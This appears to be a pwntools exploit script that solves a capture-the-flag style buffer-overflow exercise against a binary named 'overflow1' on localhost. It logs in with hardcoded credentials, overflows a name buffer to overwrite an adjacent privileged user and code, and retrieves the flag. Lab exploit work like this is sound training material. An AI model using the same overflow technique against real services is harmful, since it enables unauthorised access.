#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 14003 --libc ../../libc.so.6 ../src/overflow1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "../src/overflow1.debug")
context.terminal = ["alacritty", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "localhost"
port = int(args.PORT or 14003)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes

# from the binary
login_user = "cors33"
login_code = "aW5ub2NlbnQ="

win_user = "netrunner2d"
win_code = "2d9d90b636318a"


def exploit() -> bool:
    io = start()

    # logging
    io.info("Getting the host flag via. buffer overflow.")

    # logging in
    io.recvuntil(b"name: ")
    io.sendline(login_user.encode("ascii"))
    io.recvuntil(b"code: ")
    io.sendline(login_code.encode("ascii"))

    # overflowing the username
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"name: ")

    # forming the payload
    payload = win_user
    payload += "A" * (32 - len(win_user))
    payload += win_code
    payload += "B" * (32 - len(win_code) - 4)

    # sending it
    io.info(f"Overflowing the buffer with {payload}.")
    io.sendline(payload.encode("ascii"))

    # overflowing the username
    io.recvuntil(b"> ")
    io.sendline(b"2")

    # getting the flag
    io.recvuntil(b"... ")
    flag = io.recvuntil(b"\n", drop=True).decode("ascii")

    # comparing to the actual flag
    with open("./flag.txt", "r") as f_in:
        buf = f_in.readline().strip()
        if buf in flag:
            io.success(f"Flag: {flag}")
            return True
        return False


if __name__ == "__main__":
    exit(exploit())
